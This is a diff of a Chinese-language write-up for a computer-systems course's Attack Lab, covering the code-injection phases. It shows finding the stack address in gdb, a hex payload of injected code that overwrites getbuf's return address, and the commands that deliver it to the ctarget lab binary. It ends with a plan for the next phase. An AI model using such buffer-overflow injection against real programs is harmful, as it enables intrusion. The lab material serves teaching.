@@ -227,11 +227,17 @@ Disassembly of section .text:
    c:	c3                   	retq
 ```
 
-另外还需要得到注入代码的内存地址（即栈地址），以确定返回地址：
+另外还需要得到注入代码的内存地址（即getbuf中的栈顶地址），以确定返回地址。
 
+使用gdb进行调试，首先看一下反汇编得到的指令地址，要得到getbuf中的栈顶地址，我们可以在mov %rsp, %rdi指令处打断点，对应的指令地址为0x4017ac:
 
+![image-20220808213607260](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213607.png)
 
-得到输入字符串的十六进制表示：
+![image-20220808213859401](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213859.png)
+
+从图中可以看到，执行到断点处时，rsp，即栈顶地址为0x5561dc78，这个地址也就是输入字符串的存储地址，自然也是注入代码的地址。
+
+那么getbuf的返回地址也就是要替换为0x5561dc78即可，结合前面注入代码的是十六进制表示，最终可以得到整个输入字符串的十六进制表示：
 
 ```shell
 48 c7 c7 fa 97 b9 59 68 
@@ -242,7 +248,34 @@ ec 17 40 00 c3 00 00 00
 78 dc 61 55 00 00 00 00
 ```
 
+执行：
+
+```shell
+hex2raw <attack2.txt >attack2raw.txt
+ctarget -q -i attack2raw.txt
+```
+
+攻击成功：
+
+![image-20220808214628387](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808214628.png)
+
 CI(phase 3)
+
+分析touch3的代码可以发现，touch3与touch2类似，仍旧是需要将cookie作为参数传递进去，但不同之处在于，touch2的参数类型为unsigned int，因此直接传递cookie本身即可，但touch3的参数类型为char *，需要将一个地址作为参数传递，自然的，这个地址里存储的就是cookie。
+
+目前需要做的是：
+
+* 将cookie放进内存，这一步通过输入字符串即可将cookie放到栈上
+* 将cookie的地址放进rdi，然后调用touch3
+* 覆盖getbuf的返回地址
+
+整理目前的条件：
+
+* 栈可执行
+* 栈地址固定
+* 并且在刚刚的phase 2完成了一次代码注入
+
+
 
 ROP(phase 1)
 
